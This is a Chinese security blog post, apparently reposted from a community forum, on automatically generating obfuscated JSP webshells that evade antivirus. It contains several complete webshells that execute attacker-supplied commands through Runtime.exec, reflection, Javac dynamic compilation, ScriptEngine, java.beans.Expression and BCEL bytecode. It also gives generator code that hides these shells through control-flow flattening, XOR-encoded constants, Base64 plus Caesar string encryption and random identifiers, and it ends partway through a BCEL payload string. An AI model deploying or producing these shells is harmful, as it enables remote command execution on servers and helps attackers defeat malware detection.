本文首发于先知社区：<https://xz.aliyun.com/t/10507>

0x00 简介
-------

前段时间笔者在研究AST相关技术和JS的混淆技巧，无意间想到，能否将一些技术和思路应用在Webshell的免杀呢？

于是尝试编写了一个自动生成免杀Webshell的工具

笔者目前本科在读，才疏学浅，错误和不足之处还请大佬指出，十分感谢！

0x01 从一句话开始
-----------

首先从一句话角度来做，给出JSP的一句话

这个Webshell是会直接被`Windows Defender`杀的，百度`WEBDIR+`也会杀

```java
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

尝试拆开一句话，再加入回显和消除乱码，得到这样的代码

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    Runtime rt = Runtime.getRuntime();
    String cmd = request.getParameter("cmd");
    Process process = rt.exec(cmd);
    java.io.InputStream in = process.getInputStream();
    // 回显
    out.print("");
    // 网上流传的回显代码略有问题，建议采用这种方式
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("");
%>
```

绕过了`Windows Defender`和百度`WEBDIR+`

然而我们不能满足于当前的情况，因为这些平台的查杀力度并不是很强

再这个基础上，可以加入反射调用来做进一步的免杀

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    // 加入一个密码
    String PASSWORD = "password";
    String passwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    if (!passwd.equals(PASSWORD)) {
        return;
    }
    // 反射调用
    Class rt = Class.forName("java.lang.Runtime");
    java.lang.reflect.Method gr = rt.getMethod("getRuntime");
    java.lang.reflect.Method ex = rt.getMethod("exec", String.class);
    Process process = (Process) ex.invoke(gr.invoke(null), cmd);
    // 类似上文做回显
    java.io.InputStream in = process.getInputStream();
    out.print("");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("");
%>
```

以上的情况其实已经做到了足够的免杀，但是否能够进一步做免杀呢

0x02 控制流平坦化
-----------

在反射调用的基础上结合控制流平坦化的思想后，会达到怎样的效果呢

（对于控制流平坦化的概念笔者其实并不是非常清晰，大致来说就是将代码转为switch块和分发器）

以下是上文反射代码修改后的结果，可以手动也可以写脚本来生成，这并不是本文的重点

```java
// 这里给出的是规定顺序的分发器
String dispenserArr = "0|1|2|3|4|5|6|7|8|9|10|11|12";
String[] b = dispenserArr.split("\\|");

int index = 0;
// 声明变量
String passwd = null;
String cmd = null;
Class rt = null;
java.lang.reflect.Method gr = null;
java.lang.reflect.Method ex = null;
Process process = null;
java.io.InputStream in = null;
java.io.InputStreamReader resulutReader = null;
java.io.BufferedReader stdInput = null;

while (true) {
    int op = Integer.parseInt(b[index++]);
    switch (op) {
        case 0:
            passwd = request.getParameter("pwd");
            break;
        case 1:
            cmd = request.getParameter("cmd");
            break;
        case 2:
            if (!passwd.equals(PASSWORD)) {
                return;
            }
            break;
        case 3:
            rt = Class.forName("java.lang.Runtime");
            break;
        case 4:
            gr = rt.getMethod("getRuntime");
            break;
        case 5:
            ex = rt.getMethod("exec", String.class);
            break;
        case 6:
            process = (Process) ex.invoke(gr.invoke(null), cmd);
            break;
        case 7:
            in = process.getInputStream();
            break;
        case 8:
            out.print("");
            break;
        case 9:
            resulutReader = new java.io.InputStreamReader(in);
            break;
        case 10:
            stdInput = new java.io.BufferedReader(resulutReader);
        case 11:
            String s = null;
            while ((s = stdInput.readLine()) != null) {
                out.println(s);
            }
            break;
        case 12:
            out.print("");
            break;
    }
}
```

注意到在开头定义了`0|1|2|3|4|5|6|7|8|9|10|11|12`这样的字符串，其中数字的顺序对应了`switch`块中的执行顺序，当前是从第0条到第12条执行

在进入`switch`之前，需要实现声明变量，否则在Java的语法下，单一`case`语句的变量无法被其他`case`语句获取

当执行完命令后，变量`index`会超过最大索引，导致报错停止脚本，所以并不会出现占用服务端资源的情况

然而在这种情况下，分发器中的数字顺序是一定的，`case`块的顺序也是一定的，所以需要打乱这些变量实现混淆和免杀

笔者使用了Java的AST库`JavaParser`解析代码并实现这样的功能

```java
if (target instanceof StringLiteralExpr) {
    // StringLiteralExpr对象就是简单的字符串
    String value = ((StringLiteralExpr) target).getValue();
    // 如果包含了这个符号认为是分发器
    if (value.contains("|")) {
        String[] a = value.split("\\|");
        int length = a.length;
        // 一个简单的数组打乱算法
        for (int i = length; i > 0; i--) {
            int randInd = rand.nextInt(i);
            String temp = a[randInd];
            a[randInd] = a[i - 1];
            a[i - 1] = temp;
        }
        // 打乱后的数字再用|拼起来
        StringBuilder sb = new StringBuilder();
        for (String s : a) {
            sb.append(s).append("|");
        }
        String finalStr = sb.toString();
        finalStr = finalStr.substring(0, finalStr.length() - 1);
        // 打乱后的分发器设置回去
        ((StringLiteralExpr) target).setValue(finalStr);
        result = finalStr;
    }
}
```

打乱`switch-case`块的代码

```java
String[] a = target.split("\\|");
// 得到Switch语句为了后文的替换
SwitchStmt stmt = method.findFirst(SwitchStmt.class).isPresent() ?
    method.findFirst(SwitchStmt.class).get() : null;
if (stmt == null) {
    return;
}
// 得到所有的Case块
List<SwitchEntry> entryList = method.findAll(SwitchEntry.class);
for (int i = 0; i < entryList.size(); i++) {
    // Case块的Label是数字
    if (entryList.get(i).getLabels().get(0) instanceof IntegerLiteralExpr) {
        // 拿到具体的数字对象IntegerLiteralExpr
        IntegerLiteralExpr expr = (IntegerLiteralExpr) entryList.get(i).getLabels().get(0);
        // 设置为分发器对应的顺序数字
        expr.setValue(a[i]);
    }
}
// 打乱Case块集合
NodeList<SwitchEntry> switchEntries = new NodeList<>();
Collections.shuffle(entryList);
switchEntries.addAll(entryList);
// 塞回原来的Switch中
stmt.setEntries(switchEntries);
```

经过打乱后的效果还是比较满意的

```java
String dispenserArr = "1|2|9|4|11|10|3|8|7|12|5|0|6";
String[] b = dispenserArr.split("\\|");
...
while (true) {
    int op = Integer.parseInt(b[index++]);
    switch(op) {
        case 11:
            gr = rt.getMethod("getRuntime");
            break;
        case 0:
            String s = null;
            while ((s = stdInput.readLine()) != null) {
                out.println(s);
            }
            break;
        case 5:
            stdInput = new java.io.BufferedReader(resulutReader);
        case 12:
            resulutReader = new java.io.InputStreamReader(in);
            break;
        case 4:
            rt = Class.forName("java.lang.Runtime");
            break;
        ...
    }
}
```

0x03 异或加密数字
-----------

异或加密很简单：`a^b=c`那么`a^c=b`

如果a变量是加密的目标，我们就可以随机一个b，计算得到的c和b异或回到原来的a

对于其中的数字，可以采用异或加密，并可以使用多重

而笔者发现其中的数字变量其实并不够多，那么如何造出来更多的数字变量呢？

把字符串变量都提到全局数组，然后用数组访问的方式使用字符串

```java
String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11|12|13", "pwd", "cmd", "java.lang.Runtime",
                    "getRuntime", "exec", "", ""};
String temp = globalArr[0];
String[] b = temp.split("\\|");
...
while (true) {
    int op = Integer.parseInt(b[index++]);
    switch (op) {
        case 0:
            passwd = request.getParameter(globalArr[1]);
            break;
        case 1:
            cmd = request.getParameter(globalArr[2]);
            break;
        ...
    }
}
```

这时候的`globalArr[1]`调用方式就可以用异或加密了

```java
Random random = new Random();
random.setSeed(System.currentTimeMillis());
// 遍历所有的简单数字对象
List<IntegerLiteralExpr> integers = method.findAll(IntegerLiteralExpr.class);
for (IntegerLiteralExpr i : integers) {
    // 原来的数字a
    int value = Integer.parseInt(i.getValue());
    // 随机的数字b
    int key = random.nextInt(1000000) + 1000000;
    // c=a^b
    int cipherNum = value ^ key;
    // 用一个括号包裹a^b防止异常
    EnclosedExpr enclosedExpr = new EnclosedExpr();
    BinaryExpr binaryExpr = new BinaryExpr();
    // 构造一个c^b
    binaryExpr.setLeft(new IntegerLiteralExpr(String.valueOf(cipherNum)));
    binaryExpr.setRight(new IntegerLiteralExpr(String.valueOf(key)));
    binaryExpr.setOperator(BinaryExpr.Operator.XOR);
    // 塞回去
    enclosedExpr.setInner(binaryExpr);
    i.replace(enclosedExpr);
}
```

双重异或加密后的效果

```java
String[] globalArr = new String[] { "1|11|13|9|5|8|12|3|4|2|10|6|7|0", "pwd", "cmd", "java.lang.Runtime", "getRuntime", "exec", "", "" };
String temp = globalArr[((1913238 ^ 1011481) ^ (432471 ^ 1361880))];
...
int index = ((4813 ^ 1614917) ^ (381688 ^ 1926256));
...
while (true) {
    int op = Integer.parseInt(b[index++]);
    switch(op) {
        case ((742064 ^ 1861497) ^ (1601269 ^ 1006398)):
            out.print(globalArr[((367062 ^ 1943510) ^ (1568013 ^ 1037067))]);
            break;
        case ((108474 ^ 1265634) ^ (575043 ^ 1715728)):
            cmd = request.getParameter(globalArr[((735637 ^ 1455096) ^ (115550 ^ 1886513))]);
            break;
        case ((31179 ^ 1437731) ^ (335232 ^ 1086562)):
            resulutReader = new java.io.InputStreamReader(in);
            break;
        ...
    }
}
```

0x04 加密字符串常量
------------

还剩一部，其中提取的`globalArr`中的字符串是明文的

加密的算法必须是可逆的，因为在执行的时候需要取出来还原

笔者选择了比较简单的恺撒加密，没有使用复杂的AES等加密

由于恺撒加密无法对特殊字符加密，所以最终选择了Base64加恺撒加密的做法

给出网上找到的算法，在这个基础上做了修改

```java
// 加密算法
public static String encryption(String str, int offset) {
    char c;
    StringBuilder str1 = new StringBuilder();
    for (int i = 0; i < str.length(); i++) {
        c = str.charAt(i);
        if (c >= 'a' && c <= 'z') {
            c = (char) (((c - 'a') + offset) % 26 + 'a');
        } else if (c >= 'A' && c <= 'Z') {
            c = (char) (((c - 'A') + offset) % 26 + 'A');
        } else if (c >= '0' && c <= '9') {
            c = (char) (((c - '0') + offset) % 10 + '0');
        } else {
            str1 = new StringBuilder(str);
            break;
        }
        str1.append(c);
    }
    sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder();
    return encoder.encode(str1.toString().getBytes(StandardCharsets.UTF_8));
}

// 需要嵌入JSP的解密算法
public static String dec(String str, int offset) {
    try {
        // 先Base64解码
        byte[] code = java.util.Base64.getDecoder().decode(str.getBytes("utf-8"));
        str = new String(code);
        char c;
        // 然后尝试恺撒密码解密
        StringBuilder str1 = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            c = str.charAt(i);
            if (c >= 'a' && c <= 'z') {
                c = (char) (((c - 'a') - offset + 26) % 26 + 'a');
            } else if (c >= 'A' && c <= 'Z') {
                c = (char) (((c - 'A') - offset + 26) % 26 + 'A');
            } else if (c >= '0' && c <= '9') {
                c = (char) (((c - '0') - offset + 10) % 10 + '0');
            } else {
                str1 = new StringBuilder(str);
                break;
            }
            str1.append(c);
        }
        String result = str1.toString();
        // 处理特殊情况
        result = result.replace("\\\"","\"");
        result = result.replace("\\n","\n");
        return result;
    } catch (Exception ignored) {
        return "";
    }
}
```

注意到恺撒密码需要一个偏移量，所以需要保存下这个偏移写入JSP

```java
Random random = new Random();
random.setSeed(System.currentTimeMillis());
// 随机偏移
int offset = random.nextInt(9) + 1;
// 得到字符串
List<StringLiteralExpr> stringList = method.findAll(StringLiteralExpr.class);
for (StringLiteralExpr s : stringList) {
    if (s.getParentNode().isPresent()) {
        // 如果是数组中的字符串
        if (s.getParentNode().get() instanceof ArrayInitializerExpr) {
            // 进行加密
            String encode = EncodeUtil.encryption(s.getValue(), offset);
            // 可能会有意外的换行
            encode = encode.replace(System.getProperty("line.separator"), "");
            // 设置回去
            s.setValue(encode);
        }
    }
}
// 记录偏移量
return offset;
```

重点来了，在被加密的字符串调用的时候需要添加上解密函数

效果是：`globalArr[1] -> dec(global[1])`

```java
public static void changeRef(MethodDeclaration method, int offset) {
    // 所有的数组访问对象
    List<ArrayAccessExpr> arrayExpr = method.findAll(ArrayAccessExpr.class);
    for (ArrayAccessExpr expr : arrayExpr) {
        // 如果访问的是globalArr
        if (expr.getName().asNameExpr().getNameAsString().equals("globalArr")) {
            // 造一个方法调用对象，调用的是解密dec方法
            MethodCallExpr methodCallExpr = new MethodCallExpr();
            methodCallExpr.setName("dec");
            methodCallExpr.setScope(null);
            // dec方法参数需要是NodeList对象
            NodeList<Expression> nodeList = new NodeList<>();
            ArrayAccessExpr a = new ArrayAccessExpr();
            a.setName(expr.getName());
            a.setIndex(expr.getIndex());
            // 第一个参数为原来的数组调用
            nodeList.add(a);
            // 记录的offset需要传入第二个参数
            IntegerLiteralExpr intValue = new IntegerLiteralExpr();
            // 塞回去
            intValue.setValue(String.valueOf(offset));
            nodeList.add(intValue);
            methodCallExpr.setArguments(nodeList);
            expr.replace(methodCallExpr);
        }
    }
}
```

处理后的结果，结合异或加密来看效果很不错

```java
String[] globalArr = new String[] { "M3w4fDV8OXwyfDB8NHw2fDEwfDEzfDF8MTF8MTJ8Nw==", "dWJp", "aHJp", "amF2YS5sYW5nLlJ1bnRpbWU=", "bGp5V3pzeW5yag==", "amNqaA==", "PHByZT4=", "PC9wcmU+" };
...
while (true) {
    int op = Integer.parseInt(b[index++]);
    switch(op) {
        case ((268173 ^ 1238199) ^ (588380 ^ 1968486)):
            ex = rt.getMethod(dec(globalArr[((895260 ^ 1717841) ^ (247971 ^ 1333227))], ((706827 ^ 1975965) ^ (557346 ^ 1863345))), String.class);
            break;
            break;
        case ((713745 ^ 1371509) ^ (428255 ^ 1606073)):
            gr = rt.getMethod(dec(globalArr[((254555 ^ 1810726) ^ (282391 ^ 1838190))], ((414648 ^ 1339706) ^ (324750 ^ 1496585))));
            break;
        case ((63576 ^ 1062484) ^ (129115 ^ 1128030)):
            rt = Class.forName(dec(globalArr[((193062 ^ 1348770) ^ (1652640 ^ 1003815))], ((369433 ^ 1334986) ^ (200734 ^ 1240520))));
            break;
        ...
    } 
}
```

0x05 标识符随机命名
------------

还差一步，需要对其中所有的标识符进行随机命名

这一步不难，拿到所有的`NameExpr`对name属性做修改即可

```java
Map<String,String> vas = new HashMap<>();
// 所有的变量声明
List<VariableDeclarator> vaList = method.findAll(VariableDeclarator.class);
for(VariableDeclarator va:vaList){
    // 将变量名都随机修改
    String newName = RandomUtil.getRandomString(20);
    // 注意记录变量的映射关系
    vas.put(va.getNameAsString(), newName);
    va.setName(newName);
}
// 需要修改引用到该变量的变量名
method.findAll(NameExpr.class).forEach(n->{
    // 修改引用
    if(vas.containsKey(n.getNameAsString())){
        n.setName(vas.get(n.getNameAsString()));
    }
});
```

0x06 反射马最终处理
------------

最后需要在JSP开头处塞入解密方法，而解密方法也可以进行除了恺撒加密这一步以外的其他手段

反射调用Webshell的例子经过处理后，最终的结果如下

```java
<%@ page language="java" pageEncoding="UTF-8"%><%! String PASSWORD = "passwdd"; %><%!public static String dec(String str, int offset) {
    try {
        byte[] RdhWGkNRTHraMoNXnbqd = java.util.Base64.getDecoder().decode(str.getBytes("utf-8"));
        str = new String(RdhWGkNRTHraMoNXnbqd);
        char tBUyKgoXbsPvSsCJSufs;
        StringBuilder RsYpziowqWZoOiHwzNsD = new StringBuilder();
        for (int TjYCIPdUeOmJcJBsquxo = (1121081 ^ 1121081); TjYCIPdUeOmJcJBsquxo < str.length(); TjYCIPdUeOmJcJBsquxo++) {
            tBUyKgoXbsPvSsCJSufs = str.charAt(TjYCIPdUeOmJcJBsquxo);
            if (tBUyKgoXbsPvSsCJSufs >= 'a' && tBUyKgoXbsPvSsCJSufs <= 'z') {
                tBUyKgoXbsPvSsCJSufs = (char) (((tBUyKgoXbsPvSsCJSufs - 'a') - offset + (1931430 ^ 1931452)) % (1564233 ^ 1564243) + 'a');
            } else if (tBUyKgoXbsPvSsCJSufs >= 'A' && tBUyKgoXbsPvSsCJSufs <= 'Z') {
                tBUyKgoXbsPvSsCJSufs = (char) (((tBUyKgoXbsPvSsCJSufs - 'A') - offset + (1571561 ^ 1571571)) % (1308881 ^ 1308875) + 'A');
            } else if (tBUyKgoXbsPvSsCJSufs >= '0' && tBUyKgoXbsPvSsCJSufs <= '9') {
                tBUyKgoXbsPvSsCJSufs = (char) (((tBUyKgoXbsPvSsCJSufs - '0') - offset + (1720022 ^ 1720028)) % (1441753 ^ 1441747) + '0');
            } else {
                RsYpziowqWZoOiHwzNsD = new StringBuilder(str);
                break;
            }
            RsYpziowqWZoOiHwzNsD.append(tBUyKgoXbsPvSsCJSufs);
        }
        String TCdtxqdRtUvCZbefvpib = RsYpziowqWZoOiHwzNsD.toString();
        TCdtxqdRtUvCZbefvpib = TCdtxqdRtUvCZbefvpib.replace("\\\"", "\"");
        TCdtxqdRtUvCZbefvpib = TCdtxqdRtUvCZbefvpib.replace("\\n", "\n");
        return TCdtxqdRtUvCZbefvpib;
    } catch (Exception ignored) {
        return "";
    }
}%><%
    try {
        String[] ohMQjyWPNghGDIectNXy = new String[] { "M3w3fDl8MTF8MTB8NHwxfDEzfDB8Nnw4fDEyfDJ8NQ==", "eWZt", "bHZt", "amF2YS5sYW5nLlJ1bnRpbWU=", "cG5jQWR3Y3J2bg==", "bmdubA==", "PHByZT4=", "PC9wcmU+" };
        String KYojVAFKnStuhAMYzhkx = dec(ohMQjyWPNghGDIectNXy[((234768 ^ 1973569) ^ (590428 ^ 1346061))], ((651824 ^ 1630724) ^ (814895 ^ 1933074)));
        String[] yvralpImQfqgUyDKbRSG = KYojVAFKnStuhAMYzhkx.split("\\|");
        int kGsnqIufqoPkrtLHXIaW = ((279689 ^ 1441046) ^ (1995565 ^ 1034930));
        String llbDKgUNpIZeFFzrADVc = null;
        String DnyFyfbKEMRubCuIJCGT = null;
        Class sdyNhFJrytFWBVFtHBAW = null;
        java.lang.reflect.Method IggLavlquoqeLcmkEMCH = null;
        java.lang.reflect.Method vECcMsoXaxNOVEfGJtyD = null;
        Process PqYHaydLQrLSTEejmXPC = null;
        java.io.InputStream SOPjuNYhMRIxBIMFsLnC = null;
        java.io.InputStreamReader OskZRyDgCtUfhCNMbiHl = null;
        java.io.BufferedReader ADbSwyDfyRrnejwmlMVP = null;
        byte[] FyRwKNOxPNyWZqTioayh = null;
        while (true) {
            int ckwcNOWaQwslAqKXsBXS = Integer.parseInt(yvralpImQfqgUyDKbRSG[kGsnqIufqoPkrtLHXIaW++]);
            switch(ckwcNOWaQwslAqKXsBXS) {
                case ((130619 ^ 1310711) ^ (16539 ^ 1196378)):
                    SOPjuNYhMRIxBIMFsLnC = PqYHaydLQrLSTEejmXPC.getInputStream();
                    break;
                case ((70158 ^ 1439183) ^ (936575 ^ 1748408)):
                    out.print(dec(ohMQjyWPNghGDIectNXy[((1035581 ^ 1276560) ^ (1012433 ^ 1295738))], ((408828 ^ 1977713) ^ (805113 ^ 1333629))));
                    break;
                case ((791991 ^ 1721991) ^ (276318 ^ 1205350)):
                    OskZRyDgCtUfhCNMbiHl = new java.io.InputStreamReader(SOPjuNYhMRIxBIMFsLnC);
                    break;
                case ((994327 ^ 1996681) ^ (272624 ^ 1405797)):
                    sdyNhFJrytFWBVFtHBAW = Class.forName(dec(ohMQjyWPNghGDIectNXy[((723389 ^ 1911990) ^ (940741 ^ 1605581))], ((565548 ^ 1732890) ^ (581035 ^ 1707412))));
                    break;
                case ((660296 ^ 1894086) ^ (864030 ^ 1825429)):
                    out.print(dec(ohMQjyWPNghGDIectNXy[((160730 ^ 1269193) ^ (2021183 ^ 1046827))], ((530501 ^ 1792818) ^ (68852 ^ 1200010))));
                    break;
                case ((314344 ^ 1957918) ^ (171737 ^ 1815843)):
                    ADbSwyDfyRrnejwmlMVP = new java.io.BufferedReader(OskZRyDgCtUfhCNMbiHl);
                case ((7180 ^ 1883268) ^ (1034438 ^ 1271886)):
                    FyRwKNOxPNyWZqTioayh = new byte[((874262 ^ 1421190) ^ (356355 ^ 1933459))];
                    break;
                case ((840786 ^ 1964027) ^ (75706 ^ 1049616)):
                    llbDKgUNpIZeFFzrADVc = request.getParameter(dec(ohMQjyWPNghGDIectNXy[((313090 ^ 1196306) ^ (855029 ^ 1805796))], ((1045651 ^ 1997062) ^ (598409 ^ 1616917))));
                    break;
                case ((472276 ^ 1989936) ^ (960482 ^ 1560079)):
                    if (!llbDKgUNpIZeFFzrADVc.equals(PASSWORD)) {
                        return;
                    }
                    break;
                case ((405394 ^ 1254229) ^ (606815 ^ 1855135)):
                    DnyFyfbKEMRubCuIJCGT = request.getParameter(dec(ohMQjyWPNghGDIectNXy[((877796 ^ 1647594) ^ (1003933 ^ 1775249))], ((417054 ^ 1917469) ^ (779740 ^ 1112790))));
                    break;
                case ((766303 ^ 1441376) ^ (438729 ^ 1638140)):
                    IggLavlquoqeLcmkEMCH = sdyNhFJrytFWBVFtHBAW.getMethod(dec(ohMQjyWPNghGDIectNXy[((213616 ^ 1517688) ^ (867884 ^ 1659936))], ((741373 ^ 1786126) ^ (161325 ^ 1210583))));
                    break;
                case ((93071 ^ 1493750) ^ (108351 ^ 1443399)):
                    PqYHaydLQrLSTEejmXPC = (Process) vECcMsoXaxNOVEfGJtyD.invoke(IggLavlquoqeLcmkEMCH.invoke(null), DnyFyfbKEMRubCuIJCGT);
                    break;
                case ((480088 ^ 1200421) ^ (422292 ^ 1274859)):
                    String VzWBitUpHtiNHjloSSoh = null;
                    while ((VzWBitUpHtiNHjloSSoh = ADbSwyDfyRrnejwmlMVP.readLine()) != null) {
                        out.println(VzWBitUpHtiNHjloSSoh);
                    }
                    break;
                case ((492345 ^ 1552686) ^ (791819 ^ 1845016)):
                    vECcMsoXaxNOVEfGJtyD = sdyNhFJrytFWBVFtHBAW.getMethod(dec(ohMQjyWPNghGDIectNXy[((914605 ^ 1809294) ^ (17726 ^ 1452568))], ((937477 ^ 1205935) ^ (615802 ^ 1396185))), String.class);
                    break;
            }
        }
    } catch (Exception ignored) {
    }
 %>
```

0x07 Javac动态编译
--------------

三梦师傅提供的Javac动态编译免杀马也可以进一步处理，在工具中已经实现

在JSP中构造命令执行的Java代码动态编译并执行实现Webshell

其中append很多字符串而不直接写，为了更好地恺撒加密和异或加密

处理前的原版Webshell如下：

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="javax.tools.ToolProvider" %>
<%@ page import="javax.tools.JavaCompiler" %>
<%@ page import="javax.tools.DiagnosticCollector" %>
<%@ page import="java.util.Locale" %>
<%@ page import="java.nio.charset.Charset" %>
<%@ page import="javax.tools.StandardJavaFileManager" %>
<%@ page import="java.util.Random" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.io.File" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%
    String PASSWORD = "password";
    String cmd = request.getParameter("cmd");
    String pwd = request.getParameter("pwd");
    if (!pwd.equals(PASSWORD)) {
        return;
    }
    String tmpPath = Files.createTempDirectory("xxxxx").toFile().getPath();
    JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();
    DiagnosticCollector diagnostics = new DiagnosticCollector();
    StandardJavaFileManager standardJavaFileManager = javaCompiler.getStandardFileManager(diagnostics, Locale.CHINA, Charset.forName("utf-8"));
    int id = new Random().nextInt(10000000);
    StringBuilder stringBuilder = new StringBuilder()
            .append("import java.io.BufferedReader;\n")
            .append("import java.io.IOException;\n")
            .append("import java.io.InputStream;\n")
            .append("import java.io.InputStreamReader;\n")
            .append("public class Evil" + id + " {\n")
            .append("   public static String result = \"\";\n")
            .append("   public Evil" + id + "() throws Throwable  {\n")
            .append("        StringBuilder stringBuilder = new StringBuilder();\n")
            .append("        try {")
            .append("               BufferedReader bufferedReader = new BufferedReader(new InputStreamReader" +
                    "(Runtime.getRuntime().exec(\"" + cmd + "\").getInputStream()));\n")
            .append("               String line;\n")
            .append("               while((line = bufferedReader.readLine()) != null) {\n")
            .append("                       stringBuilder.append(line).append(\"\\n\");\n")
            .append("               }\n")
            .append("               result = stringBuilder.toString();\n")
            .append("        } catch (Exception e) {\n")
            .append("              e.printStackTrace();\n")
            .append("        }\n")
            .append("        throw new Throwable(stringBuilder.toString());")
            .append("   }\n")
            .append("}");
    Files.write(Paths.get(tmpPath + File.separator + "Evil" + id + ".java"), stringBuilder.toString().getBytes());
    Iterable fileObject = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + "Evil" + id + ".java");
    javaCompiler.getTask(null, standardJavaFileManager, diagnostics, null, null, fileObject).call();
    try {
        new URLClassLoader(new URL[]{new URL("file:" + tmpPath + File.separator)}).loadClass("Evil" + id).newInstance();
    } catch (Throwable e) {
        response.getWriter().print("" + e.getMessage() + "");
    }
%>
```

0x08 ScriptEngine免杀
-------------------

参考天下大木头师傅的ScriptEngine调用JS免杀马，在工具中完成了进一步的免杀

其中append很多字符串而不直接写，一方面为了更好地恺撒加密和异或加密，另外考虑是防止`java.lang.Runtime`这样的黑名单检测

处理前的原版Webshell如下：

```java
<%@ page import="java.io.InputStream" %>
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    String PASSWORD = "password";
    javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName("JavaScript");
    engine.put("request",request);
    String pwd = request.getParameter("pwd");
    if(!pwd.equals(PASSWORD)){
        return;
    }
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("function test(){")
            .append("try {\n")
            .append("  load(\"nashorn:mozilla_compat.js\");\n")
            .append("} catch (e) {}\n")
            .append("importPackage(Packages.java.lang);\n")
            .append("var cmd = request.getParameter(\"cmd\");")
            .append("var x=java/****/.lang./****/Run")
            .append("time./****")
            .append("/getRunti")
            .append("me()/****/.exec(cmd);")
            .append("return x.getInputStream();};")
            .append("test();");
    java.io.InputStream in = (InputStream) engine.eval(stringBuilder.toString());
    StringBuilder outStr = new StringBuilder();
    response.getWriter().print("");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        outStr.append(s + "\n");
    }
    response.getWriter().print(outStr.toString());
    response.getWriter().print("");
%>
```

0x09 Expression免杀
-----------------

使用`java.beans.Expression`类进行免杀，原理较简单，已在工具中实现

处理前的原版Webshell如下：

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    String cmd = request.getParameter("cmd");
    // 这里的exec可以拆为四个字符的ASCII做进一步免杀
    java.beans.Expression shell = new java.beans.Expression(Runtime.getRuntime(),"exec",new Object[]{cmd});
    java.io.InputStream in = ((Process)shell.getValue()).getInputStream();
    // 普通回显
    StringBuilder outStr = new StringBuilder();
    response.getWriter().print("");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        outStr.append(s + "\n");
    }
    response.getWriter().print(outStr.toString());
    response.getWriter().print("");
%>
```

0x0a BCEL字节码免杀
--------------

来自Java安全界比较知名的`BCELClassLoader`，不过对于JDK的版本有一定的限制

在工具中实现了静态BCEL字节码和ASM动态构造的两种免杀Webshell

处理前的静态JSP如下：

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%! String PASSWORD = "4ra1n"; %>
<%
    String cmd = request.getParameter("cmd");
    String pwd = request.getParameter("pwd");
    if (!pwd.equals(PASSWORD)) {
        return;
    }
    String bcelCode = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$5bW$hU$U$fe$86$ML$Y$86B$93R$$Z$bcQ$hn$j$ad$b7Z$w$da$mT4$5c$84$W$a4x$9bL$Oa$e8d$sN$s$I$de$aa$fe$86$fe$87$beZ$97$86$$q$f9$e8$83$8f$fe$M$7f$83$cb$fa$9dI$I$89$84$e5$ca$ca$3es$f6$de$b3$f7$b7$bf$bd$cf$99$3f$fe$f9$e57$A$_$e3$7b$jC$98$d6$f0$a6$8e6$b9$be$a5$e1$86$8e4f$a4x$5b$c7$y$e6t$b4$e3$a6$O$V$efH1$_$j$df$8d$e3$3d$b9f$3a$d1$8b$F$N$8b$3a$96$b0$i$c7$fb$3aV$b0$aa$e3$WnK$b1$a6c$j$ltb$Dw$e2$d8$d4$f1$n$3e$d2$f0$b1$82X$mJ$K$S$99$jk$d72$5d$cb$cb$9b$aba$e0x$f9$v$F$j$d7$j$cf$J$a7$V$f4$a5N$9aG$d7$U$a83$7eN$u$e8$c98$9eX$y$X$b2$o$b8ee$5d$n$c3$f9$b6$e5$aeY$81$p$f75$a5$gn$3bL$a5g$d2$b6pgw$j$97$vbv$n$a7$a0$bb$U$c5L$97$j7$t$C$F$83$t$d2$d5L$7c$e3L$b6$bc$b5$r$C$91$5b$RV$e4$3cPuv$7c3$ddd$a1$af$ea$S$Y$c3$af$86$96$7dw$c1$wF$40$c8$90$86O$c82$J$s$9a$d9$3d$5b$UC$c7$f7J$g$3eU$Q$P$fdjF$F$e7R$a3$adXQ$L$96$e3$v8$9f$da$3c$85$U$x$c8$b3$ccd$L$b3$82$$$c7$x$96Cn$85U$m$afu$e8$f3$c7jz$b5g$f7C$d9$95$b6$cd4$e3$d9$R$c9$fa$aa_$Ol1$e7H$w$bb$8f$u$bc$y$D$Y$b8$AKA$ff$v$a4$Rkk$86Ht$8b$fcU$9b$86$ac$B$h9$D$C$5b$g$f2$G$b6$e1$c8D$3bR$dc5$e0$e2$8a$81$C$c8$84$a2$hxQ$ee$9e$c0$93$q$f0$I$9a$G$df$40$R$9f$b1eu$b4$b6k$95$c8s$60$a0$84PC$d9$c0$$$3e7$b0$87$7d$N_$Y$f8$S_i$f8$da$c07$b8$c7$40$p$p$e9$99$d9$cc$c8$88$86o$N$7c$87a$F$bd$c7$V$$ew$84$j6$a9$8e$fa$96$ac$X$b5To$$$t$z$r$9bs$f6$d8$7d$a5$ec$85NA2$9b$Xa$7d$d3$d7$d4$f4$9aZv$5d$ec$J$5b$c1$a5V$t$a1A$b5$i$f8$b6$u$